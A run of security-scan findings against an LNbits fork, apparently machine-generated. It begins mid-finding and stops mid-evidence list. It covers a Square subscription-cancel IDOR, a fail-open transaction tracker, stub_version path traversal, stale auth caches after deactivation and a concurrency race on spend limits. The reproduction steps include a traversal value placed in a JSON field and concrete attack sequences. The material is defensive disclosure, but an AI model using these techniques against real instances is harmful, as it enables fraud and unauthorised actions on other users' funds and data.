The unit test `test_square_wallet_cancel_subscription` (tests/unit/test_fiat_providers.py:847-862) asserts the unverified id is forwarded, so the fallback is deliberate rather than accidental, but it contradicts the ownership contract in base.py. Square subscription creation through LNbits is disabled while `settings.lnbits_running` is true (square.py:140-143), but the cancel route is live and acts on every subscription in the merchant's Square account, LNbits-created or not. This is the Square sibling of the PayPal and Stripe cancel-subscription findings (different provider classes, different code paths).

## Evidence
1. [lnbits/fiat/square.py:552–610](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/square.py#L552-L610)
   _get_square_subscription_id(subscription_id, wallet_id) is the ownership check: it looks for a Square payment in the caller's wallet whose external_id (lines 560-583) or extra.subscription_request_id (lines 585-606) equals the supplied value. When neither matches — the case for a subscription owned by another wallet or by a non-LNbits customer of the merchant — or when the lookup raises (lines 607-608), it returns the raw caller-supplied subscription_id at line 610 instead of failing, so the check fails open.
2. [lnbits/fiat/square.py:200–215](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/square.py#L200-L215)
   cancel_subscription POSTs /v2/subscriptions/{square_subscription_id}/cancel with self.client (authenticated with settings.square_access_token, the merchant's token) for whatever id the helper returned, and reports ok on 2xx; the ownership lookup is therefore advisory only.
3. [lnbits/core/views/fiat\_api.py:170–185](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/fiat_api.py#L170-L185)
   DELETE /api/v1/fiat/{provider}/subscription/{subscription_id} is guarded only by require_admin_key (any wallet's admin key, including a self-registered user's own wallet) and forwards the raw path parameter with the caller's wallet id as correlation_id, relying entirely on the provider class to enforce ownership.
4. [lnbits/settings.py:838–852](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L838-L852)
   get_fiat_provider('square') (lnbits/fiat/__init__.py:26-43) gates the route only on is_fiat_provider_enabled, i.e. settings.square_enabled; the per-user square_limits.allowed_users list (get_fiat_providers_for_user, lines 855-880) is not consulted on the cancel route, so any user of the instance reaches the sink once Square is enabled.
5. [lnbits/fiat/base.py:178–192](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/base.py#L178-L192)
   The FiatProvider contract states that correlation_id 'is used to verify that the subscription belongs to the user that made the request'; the Square implementation does not enforce this when the lookup misses.

## Impact
LNbits acts as a confused deputy: the user-to-user ownership boundary of the fiat subscription feature is broken (one user can terminate another LNbits user's Square-backed recurring subscription), but no LNbits data is disclosed, the apipayments ledger is not altered directly, and service availability is unaffected. Subsequent-system impact: The operator's Square merchant account: the code issues POST /v2/subscriptions/{attacker-chosen id}/cancel under the operator's access token. Assumption (remote service, not a pinned dependency): Square's CancelSubscription API schedules cancellation of the identified subscription in the merchant account, irreversibly ending another party's recurring billing. One known subscription per request; no data read back beyond ok/error.

## Reproduction steps
1. Attacker: any self-registered LNbits user with their own wallet admin key on an instance where settings.square_enabled is true (registration is open by default; the Square allowed_users list is not applied to this route). They send DELETE /api/v1/fiat/square/subscription/<id> naming a Square subscription id they do not own; both wallet-scoped lookups miss, line 610 returns the raw id, and LNbits issues the cancel with the merchant's token. Attack requirement: knowledge of a victim's Square subscription id (not enumerable; visible to the merchant and stored on the owning LNbits payment). No victim interaction, no race.

## Recommended fix
_get_square_subscription_id returns the unverified caller-supplied id when the wallet-scoped lookup finds no matching payment (or raises), so cancel_subscription cancels subscriptions the caller does not own with the merchant's credentials. Fix criteria: When no payment in the caller's wallet resolves to the subscription, cancel_subscription must fail without calling Square (and a lookup error must not fall through to the raw id); alternatively fetch the Square subscription and require its LNbits metadata to reference the caller's wallet before cancelling. Verify that a request from wallet A naming a subscription owned by wallet B, or unknown to LNbits, is rejected and no /v2/subscriptions/{id}/cancel request is issued.

---
**Severity:** LOW
**Status:** Open
**Category:** Insecure direct object reference
**CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257401

---

# TransactionTracker reports a dropped transaction as confirmed when history lookup fails

## Details
`TransactionTracker._fetch_status` (lnbits/utils/electrum.py:970-993) decides whether a watched transaction is confirmed by looking it up in `blockchain.scripthash.get_history` for the scripthash of the transaction's first spendable output. If that call raises `ElectrumError`, the fallback (lines 984-989) calls `get_mempool` and, when the txid is not listed, returns `OnchainTxEvent(txid, confirmed=True)` with no height. The error branch fails open: not-in-mempool is equated with mined, although a transaction that was replaced via RBF, evicted, or whose inputs were spent by a conflicting transaction is also absent from the mempool and will never confirm. Every other unknown state (line 992) correctly yields confirmed=False.

The branch is attacker-steerable because the watched scripthash is the transaction's own first non-OP_RETURN output (`tx_watch_scripthash`, electrum.py:858-864). Scenario: an attacker builds an RBF-enabled transaction whose first output is a dust payment to a very busy address (e.g. an exchange hot wallet) and whose second output pays the victim; the victim opens the transaction in the LNbits block explorer (enabled by default; page login-gated by default, WS gated only by the enabled flag), which starts a tracker via `/blockexplorer/api/v1/ws/tx/{txid}` (blockexplorer_api.py:174-186) while the tx is in the mempool (initial status: history error -> mempool lists it -> unconfirmed). The attacker then replaces the transaction. The busy address produces frequent status notifications; on the next one `_fetch_status` runs again, `get_history` fails, the original txid is no longer in the mempool, and the tracker emits `confirmed=True`. The page JS sets txStatus from the message unconditionally (static/js/pages/blockexplorer.js:517-518) and renders a green 'Confirmed' badge (blockexplorer.vue:392-398); the event also reaches any extension listener registered via `register_onchain_tx_listener` (task_manager.py:197-212). Tracking stops after that event, so the false state is final for that viewer.

Condition under which it holds: the operator's Electrum server must reject `get_history` for busy scripthashes while still answering `get_mempool`. ElectrumX does this by default (`history too large` from its limited_history path; `scripthash_get_mempool` bypasses the limit) and Fulcrum has an equivalent `max_history`; these are mainstream self-hosted servers the admin UI invites operators to configure ('Choose a public Electrum server or enter your own'). The default `ssl://electrum.blockstream.info:50002` (Blockstream electrs) is believed to fail or not implement `get_mempool`, in which case the code falls through to confirmed=False. The server behaviours are stated as assumptions and are not verified in this checkout.

The LNbits core on-chain wallet does not consume these events (no in-tree caller of track_transaction/register_onchain_tx_listener), so the impact is limited to the explorer UI and extension tx listeners: a false, final 'Confirmed' assertion for a payment that will never confirm.

## Evidence
1. [lnbits/utils/electrum.py:970–992](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/electrum.py#L970-L992)
   _fetch_status: when blockchain.scripthash.get_history raises ElectrumError, the fallback queries get_mempool and, if the txid is not among the mempool entries, returns OnchainTxEvent(confirmed=True) with height=None (line 989). Absence from the mempool is treated as proof of confirmation, although a transaction that was replaced (RBF), evicted or double-spent is equally absent. Contrast line 992, where every other unknown state yields confirmed=False.
2. [lnbits/utils/electrum.py:858–864](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/electrum.py#L858-L864)
   tx_watch_scripthash: the watched scripthash is the first non-OP_RETURN output of the transaction, so the transaction author chooses which address's history/mempool answers decide the tx's status.
3. [lnbits/utils/electrum.py:931–950](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/electrum.py#L931-L950)
   _track_once subscribes to that scripthash; on_change re-runs _fetch_status on every status notification for it and a confirmed event ends tracking, so the false confirmed=True is the final state.
4. [lnbits/core/views/blockexplorer\_api.py:174–186](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/blockexplorer_api.py#L174-L186)
   /blockexplorer/api/v1/ws/tx/{txid} (gated only by lnbits_blockexplorer_enabled, default True) relays tracker events to the browser and stops after the first event with confirmed=True.
5. [lnbits/static/js/pages/blockexplorer.js:517–518](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/pages/blockexplorer.js#L517-L518)
   The explorer page fetches the tx once over REST, then sets txStatus to every WS message without re-verification.
6. [lnbits/templates/pages/blockexplorer.vue:392–398](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/blockexplorer.vue#L392-L398)
   The UI renders txStatus.confirmed as a green 'Confirmed' badge (height row hidden when null), so the false event is shown to the viewer as a confirmed transaction.
7. [lnbits/task\_manager.py:197–212](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/task_manager.py#L197-L212)
   register_onchain_tx_listener forwards the same events to extension listeners, which may act on confirmed=True. No in-tree consumer exists; the core on-chain wallet does not use tracker events.

## Impact
Integrity LOW: the explorer and the onchain-tx-listener API assert a transaction is confirmed when it is not and never will be, which can mislead a user or extension relying on that state (a fake-confirmation payment-fraud enabler); no funds inside LNbits are moved by core on this event, and confidentiality/availability are unaffected.

## Reproduction steps
1. Attacker (anyone able to broadcast a Bitcoin transaction; no LNbits privileges) crafts an RBF transaction whose first output pays a busy address and which pays the victim, then replaces it. Attack requirements are PRESENT because of timing: the replacement must occur while a victim's tracker for the original txid is live, and a subsequent status notification on the busy scripthash must arrive before the viewer leaves. User interaction is PASSIVE: the victim merely views the transaction in the LNbits explorer, a routine action. Attack vector is NETWORK (Bitcoin P2P broadcast plus the victim's LNbits WS); complexity LOW, no shipped control must be evaded.

## Recommended fix
The get_history error fallback infers confirmation from absence in the mempool, so an unconfirmable (replaced/evicted) transaction is reported confirmed. Fix criteria: A confirmed event is emitted only on positive evidence that the transaction is in a block (history entry with height > 0, or a verified blockchain.transaction.get_merkle result); when history cannot be retrieved and the tx is absent from the mempool, the tracker reports unknown/unconfirmed (or an error) and keeps tracking. Verify by simulating a history error with an empty mempool and confirming no confirmed=True event is dispatched.

---
**Severity:** LOW
**Status:** Open
**Category:** Failing open
**CWE:** [CWE-636](https://cwe.mitre.org/data/definitions/636.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257398

---

# Extension builder stub_version used as filesystem path component (path traversal)

## Details
`ExtensionData.stub_version` is taken verbatim from the JSON body of `POST /api/v1/extension/builder/zip` and `/preview` (and `/deploy`, admin-only) and interpolated into a filesystem path: `cache_dir = Path(working_dir, f"cache-{stub_version}")` in `_get_extension_stub_release` (services/extensions_builder.py:110) and `_load_extension_stub_release_from_cache` (:145). The only validator, `validate_stub_version` (models/extensions_builder.py:451-457), forbids the `"` character; `normalize()` only strips whitespace. pathlib does not collapse `..`, so a value such as `x/../../../../../../some/where` makes `cache_dir` resolve outside `<data>/extensions_builder/extension_builder_stub/`.

Effects confirmed in the code:
- `cache_dir.mkdir(parents=True, exist_ok=True)` (:111) creates an arbitrary directory tree anywhere the LNbits process can write (the Docker image runs as root, so effectively anywhere).
- Because a traversing `stub_version` never equals a manifest version, `releases[0]` of the stub manifest is serialised and written to `<attacker path>/release.json` (:135-136): an attacker-positioned (not attacker-authored) file.
- `_load_extension_stub_release_from_cache` (:147-149) reads and parses any `release.json`-named file at the chosen path; its `version` and `archive_url` then drive `download_url`, `zipfile.extractall` and `shutil.copytree` in `_fetch_extension_builder_stub` (:153-177). No way for a non-admin to author a file named `release.json` on the server was found in this checkout (asset uploads are stored in the DB; the builder's own writes use fixed names `builder.json`/stub file names), so that escalation is unconfirmed and not rated.

Concrete availability consequences of the directory primitive, traced: a directory created at `<data>/zips/<ext_id>.zip` makes `InstallableExtension.download_archive` fail (`open(dir, 'wb')` → IsADirectoryError → AssertionError), so `install_extension`/update of that extension id fails, and after a container recreate `check_installed_extensions` (app.py:290-304) deactivates it; a directory at the builder's own `cache-<real version>/release.json` makes every builder request 500 at the `open(..., 'w')` on :135 until an admin runs `DELETE /api/v1/extension/builder`.

Who: any authenticated account when `lnbits_extensions_builder_activate_non_admins` is enabled (default False; the admin UI labels it 'Enable Extensions Builder for non admin users'); for admins the gain is nil since admins can already install arbitrary extensions. The sanctioned builder path confines a user's writes to `<data>/extensions_builder/extension_builder_stub/<ext_id>/…` and `<data>/zips/<ext_id>.zip`; this traversal escapes that boundary. Corresponds to ledger lead x-ext-04.

## Evidence
1. [lnbits/core/services/extensions\_builder.py:106–138](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/extensions_builder.py#L106-L138)
   _get_extension_stub_release builds cache_dir = Path(working_dir, f"cache-{stub_version}") from the request body (:110), mkdir(parents=True, exist_ok=True)s it (:111) and writes release.json into it (:135-136). pathlib does not collapse '..', so 'x/../../../..' escapes <data>/extensions_builder/extension_builder_stub/; the resolved directory tree is created and the file written wherever the process can write. The stub_version that traverses never equals a manifest version, so releases[0] is what gets written.
2. [lnbits/core/services/extensions\_builder.py:141–150](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/extensions_builder.py#L141-L150)
   _load_extension_stub_release_from_cache opens <working>/cache-<stub_version>/release.json at the same attacker-chosen path and parses it into ExtensionRelease via dict_to_model; the returned release's version and archive_url then drive the cache path, download_url and extractall/copytree in _fetch_extension_builder_stub (:153-177). Content control over such a file was not found in this checkout.
3. [lnbits/core/models/extensions\_builder.py:451–457](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions_builder.py#L451-L457)
   validate_stub_version is the only check on stub_version: it rejects a double quote and nothing else; normalize() (:297-298) merely strips whitespace. '/', '\\' and '..' pass.
4. [lnbits/core/views/extensions\_builder\_api.py:46–56](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extensions_builder_api.py#L46-L56)
   POST /api/v1/extension/builder/zip binds the JSON body to ExtensionData and calls build_extension_from_data(data, ...) which passes data.stub_version to _get_extension_stub_release (services:70). POST /preview (:124-137) is the same path with a fixed working_dir_name; both are gated only by check_extension_builder.
5. [lnbits/decorators.py:624–630](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L624-L630)
   check_extension_builder requires a logged-in user and allows any non-admin when settings.lnbits_extensions_builder_activate_non_admins is true (default False, settings.py:80; admin UI label 'Enable Extensions Builder for non admin users'). The traversal therefore needs only an ordinary account on instances that enable the builder for users.

## Impact
Confirmed: creation of arbitrary directory trees and placement of a fixed-content release.json anywhere the (root) process can write — limited integrity impact; and the ability to break specific functions by planting directories where files are expected (an extension's data/zips/<id>.zip blocking its install/update and causing deactivation on container recreate; the builder's own cache path breaking the builder for all users until an admin cleans it) — limited availability impact. Nothing is disclosed to the caller. Escalation to attacker-controlled archive download/extraction via a planted release.json requires a file-content primitive not found in this checkout and is not rated.

## Reproduction steps
1. An authenticated user on an instance with the builder enabled for non-admins (a non-default setting, hence AT:P) sends an otherwise valid ExtensionData body with stub_version such as 'x/../../../../../../tmp/target' to /api/v1/extension/builder/zip or /preview. The server mkdir -p's the resolved path, writes release.json there, and on later requests reads release.json from it. The only validator rejects double quotes; no path check exists; the operation is deterministic and repeatable.

## Recommended fix
A request-supplied string (stub_version) is interpolated into a filesystem path without restricting it to a single safe path segment or confining the resolved path to the builder working directory. Fix criteria: stub_version must be validated against a strict version pattern (or matched against the known stub release versions) before any path is built, and the resolved cache directory must be verified to lie under <data>/extensions_builder/extension_builder_stub. Verify: a stub_version containing '/', '\\' or '..' is rejected with 4xx and no directory or file is created or read outside the builder working directory.

---
**Severity:** LOW
**Status:** Open
**Category:** Path traversal
**CWE:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257393

---

# Deactivating a user does not evict cached sessions and wallet keys (clear uses active-only lookup)

## Details
Admin deactivation (`PUT /users/api/v1/user/{id}/activate`) is the operator's mechanism for blocking a user, and the project treats it as immediate: `get_account(active_only=True)`, `get_wallet_for_key` and `get_base_wallet_for_key` all require `activated = true`, and `tests/api/test_users.py:698-750` asserts that right after deactivation the user's Bearer token gets 401 and their invoice/admin keys get 404 on `/api/v1/payments/paginated` and `POST /api/v1/payments` (create and pay).

The two authentication caches (`auth:access_token:*`/`auth:user_id:*` for sessions, `auth:x-api-key:*` for wallet keys) are evicted only by `clear_user_id_cache(user_id)`, which calls `get_user(user_id, active_only=True)`. `get_account`'s clause `(activated = true OR activated = :activated)` reduces to `activated = true` for `active_only=True`, so for the account that was just deactivated it returns None and `clear_user_cache` never runs. Deactivation therefore evicts nothing. Neither cache-hit path re-checks activation: `check_account_id_exists` (decorators.py:270-289) returns the cached AccountId after JWT decode, the ACL check, `check_two_factor_session` (reads only `two_factor`) and `_check_user_access`; `LightKeyChecker` (decorators.py:160-167) returns the cached wallet info without the `accounts.activated = true` join. The one shared DB-touching call, `check_user_extension_access` (decorators.py:489-508), never reads the account and passes core paths unconditionally.

Effect for a deactivated user whose entries are warm (used within the previous `auth_authentication_cache_minutes`, default 10, `ge=0`; `Cache.set` stores an absolute `time()+expiry`, so the window is not sliding and cannot be extended):
- Their full session JWT keeps authenticating every `check_account_id_exists`/`check_api_write_access` endpoint (wallet create/list/reset/delete, payment listing and stats, extension enable/disable and permission grants, assets, webpush).
- Their wallet admin/invoice keys keep working on every `require_base_*` endpoint, notably `POST /api/v1/payments`: with `out: true` and the admin key the wallet can be drained during the window.

Not affected: ACL-token sessions (on a hit, `_check_account_api_access` → `get_user_access_control_lists(active_only=True)` returns an empty ACL for an inactive account → 403), and admin endpoints (`check_admin` → `check_account_exists` → uncached `_check_account_exists`, plus `api_users_toggle_activated` removes the id from `lnbits_admin_users`). The project's own test does not catch this because it never uses the token or keys before deactivating (no warm entry), and `GET /api/v1/auth` uses the uncached `check_user_exists`. `delete_account` has the same no-op eviction, but deletion is caught on the session path by `get_two_factor_config` raising for the missing row and `api_users_delete_user` clears wallet entries via `delete_wallet_by_id` → `clear_wallet_id_cache` first. The `auth:user:cache_key:` bookkeeping also records only the most recent session cache key per user, so even a working eviction would miss other sessions.

## Evidence
1. [lnbits/core/crud/users.py:316–319](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/users.py#L316-L319)
   clear_user_id_cache is the only eviction run on deactivation, and it calls get_user(user_id, active_only=True). For the account that was just set activated=False this returns None, so clear_user_cache never runs: neither the auth:access_token/auth:user_id entry nor the wallets' auth:x-api-key entries are popped. This is the code the fix must change.
2. [lnbits/core/crud/users.py:147–160](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/users.py#L147-L160)
   get_account's WHERE clause is `id = :id AND (activated = true OR activated = :activated)`; with active_only=True it reduces to `activated = true`, which a deactivated row never satisfies. This is the SQL fact that makes the eviction a no-op precisely in the deactivation case.
3. [lnbits/core/views/user\_api.py:258–264](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L258-L264)
   api_users_toggle_activated flips activated and persists it with update_account, then calls clear_user_id_cache(user_id) as the sole cache eviction. Because the account is now inactive, that call clears nothing.
4. [lnbits/decorators.py:160–167](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L160-L167)
   LightKeyChecker on a cache hit sets request.scope['user_id'], runs _check_user_access and returns the cached BaseWalletTypeInfo without ever reaching get_base_wallet_for_key, so the `accounts.activated = true` join is skipped for the TTL. A deactivated user's cached admin/invoice key therefore keeps authenticating every require_base_* endpoint.
5. [lnbits/decorators.py:270–289](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L270-L289)
   check_account_id_exists on a cache hit decodes the JWT, runs the ACL check (only when the token carries api_token_id), check_two_factor_session (reads only the two_factor column) and _check_user_access, then returns the cached AccountId. The account row is never reloaded, so activated=False is not observed until the entry expires.
6. [lnbits/decorators.py:489–508](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L489-L508)
   check_user_extension_access is the only database-touching call shared by both cache-hit paths. It consults settings.is_admin_extension/is_installed_extension_id and get_user_active_extensions_ids only; it never loads the account or reads activated. For core paths such as /api/v1/payments the inferred extension id is 'api', which is neither admin nor installed, so it returns success unconditionally. No protection on the hit path checks activation.
7. [lnbits/core/crud/wallets.py:322–341](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/wallets.py#L322-L341)
   get_base_wallet_for_key, the cache-miss path, requires `deleted = false AND accounts.activated = true`. This is the intended rule that the cache-hit path diverges from.
8. [lnbits/core/views/payment\_api.py:280–283](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L283)
   api_payments_create (POST /api/v1/payments) depends on require_base_invoice_key, i.e. LightKeyChecker; with `out: true` and a cached admin key it proceeds to pay a BOLT11/BOLT12 request. This is the concrete spend path a deactivated user keeps for the cache window.

## Impact
The operator's block is ineffective for up to auth_authentication_cache_minutes: the user can keep reading their own wallets, payments and account data (C:L) and keep spending from their wallets via POST /api/v1/payments with the cached admin key, continuing the abuse the admin tried to stop (I:L). Reach is limited to the user's own wallets and account; no other user's data or funds and no availability impact.

## Reproduction steps
1. The attacker is the (now deactivated) account holder replaying their own still-cached session JWT or wallet key over the network against the public JSON API; no interaction from anyone else is needed and there is no defence on the cache-hit path to defeat. The exploit depends on a runtime state outside the attacker's control: the admin must have deactivated them while a cache entry was warm, and the window is bounded by an absolute TTL (default 10 minutes) that cannot be refreshed once expired (AT:P). PR:L because the position is an ordinary account holder using credentials they legitimately held.

## Recommended fix
1. Cache eviction depends on an active-only account load, so it fails precisely when the account was deactivated or deleted. Fix criteria: Deactivation and deletion must evict all cached authentication for the user (all session cache keys and all of the user's wallet key entries) regardless of activation state. Verify: authenticate with a JWT and a wallet key, deactivate the user, and confirm both are rejected on the next request without waiting for the TTL.
2. Cache hit paths do not re-validate the account's activation status. Fix criteria: Cache hits should still enforce activated=true (e.g. cache the activation state and re-check cheaply, or store a per-user generation that deactivation bumps). Verify as above with eviction disabled.

---
**Severity:** LOW
**Status:** Open
**Category:** Auth bypass
**CWE:** [CWE-613](https://cwe.mitre.org/data/definitions/613.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257391

---

# Daily withdraw and time-between-transactions limits bypassable with concurrent payments (TOCTOU)

## Details
`SecuritySettings` offers operator-configured spend controls per wallet: `lnbits_wallet_limit_daily_max_withdraw` and `lnbits_wallet_limit_secs_between_trans` (settings.py:481-482; admin UI 'Maximum daily withdrawal' / 'Minimum time between payments'). They are enforced only by `check_wallet_limits` (services/payments.py:601-655), which derives its decision from existing `apipayments` rows (outgoing payments since day start; any payment in the last N seconds).

`_pay_from_wallet` (1405-1433) performs these checks in a first `db.connect()` block (`_check_wallet_for_payment`), exits the block - releasing the process-wide `Database.lock` - and only then enters a second `db.connect()` block where `_pay_invoice` acquires the per-wallet lock, re-reads the balance and inserts the debit row (`create_payment`, :889-900). The limit checks are not repeated inside the locked section and no lock is held across both phases.

Two or more overlapping POST /api/v1/payments (out=true, admin key) requests for the same wallet therefore interleave as A-phase1, B-phase1, ..., A-phase2, B-phase2: every phase-1 check observes a ledger without any of the in-flight payments and passes, then every debit is inserted. Assumption: CPython 3.10-3.12 (the pinned range; Dockerfile uses python:3.12) `asyncio.Lock.acquire()` only takes the fast path when there are no waiters, so a re-acquirer is queued behind waiters and the favourable ordering is deterministic rather than probabilistic. The attacker can widen the window further by first issuing a payment that holds the DB lock while awaiting the funding source (up to `lnbits_funding_source_pay_invoice_wait_seconds`), so that the N limit-bypassing requests all queue behind it. With N concurrent requests a wallet capped at X sats/day can withdraw N*X (bounded by its balance), and the 'seconds between transactions' rule is defeated outright.

The balance check itself is safe (re-read under the per-wallet lock, pending outgoing rows count against the balance), so this does not create negative balances; it defeats the operator's configured spending policy, which exists precisely to contain a leaked or abused admin key.

Related record: shared-wallet-send-only-key-bypasses-wallet-spend-limits (verified) covers a different path to the same limits - a send-only mirror wallet whose id is passed to check_wallet_limits so the ledger query returns nothing. This finding is independent of shared wallets: it is the concurrency window between the limit check and the debit for an ordinary lightning wallet, and remains exploitable after that record is fixed unless the check is moved under the per-wallet lock in the connection that inserts the row.

## Evidence
1. [lnbits/core/services/payments.py:1405–1433](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1405-L1433)
   _pay_from_wallet evaluates the spend limits (_check_wallet_for_payment) inside a first `async with db.connect()` block, exits it (releasing Database.lock), and only then opens a second db.connect() block in which _pay_invoice debits the wallet. Nothing (neither the DB lock nor the per-wallet asyncio lock) is held across the two phases, and the limits are not re-evaluated in phase two. This is the code the fix must change.
2. [lnbits/core/services/payments.py:1128–1144](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1128-L1144)
   _check_wallet_for_payment is the only caller of check_wallet_limits (rg confirms no other call site), so the daily-withdraw and spacing limits are evaluated solely in the first, unlocked phase.
3. [lnbits/core/services/payments.py:601–655](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L601-L655)
   check_time_limit_between_transactions and check_wallet_daily_withdraw_limit derive their decision from existing apipayments rows via get_payments(since=..., wallet_id=...). A request's own row does not exist yet at this point; it is inserted only in phase two.
4. [lnbits/core/services/payments.py:780–800](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L780-L800)
   _pay_invoice acquires wallets_payments_lock[wallet_id] and re-reads the wallet balance under it, then _pay_external_invoice (:889-900) inserts the outgoing row with create_payment. The balance is therefore race-safe, but the limit checks are never re-run under this lock.
5. [lnbits/db.py:323–343](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L323-L343)
   Database.connect() wraps every connection block in a single process-wide asyncio.Lock. Because CPython's asyncio.Lock.acquire() (3.10-3.12, the pinned range) queues a new acquirer behind existing waiters, request A's phase-2 acquire lands behind request B's pending phase-1 acquire: the interleaving A1, B1, ..., A2, B2 is deterministic, so every phase-1 check observes the ledger before any debit.
6. [lnbits/core/crud/payments.py:165–169](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L165-L169)
   get_payments_paginated with outgoing=True adds only `amount < 0`; no status clause is applied, so a pending row inserted in phase two would be counted by later checks. The bypass is purely a matter of ordering, not of payment status.
7. [lnbits/core/views/payment\_api.py:280–319](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L319)
   POST /api/v1/payments with out=true and an admin key (require_base_invoice_key, key_type admin) calls pay_invoice/pay_offer, which go straight to _pay_from_wallet. This is the network-reachable entry point; no additional limit check exists on the route.
8. [tests/unit/test\_services\_payments.py:499–545](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/unit/test_services_payments.py#L499-L545)
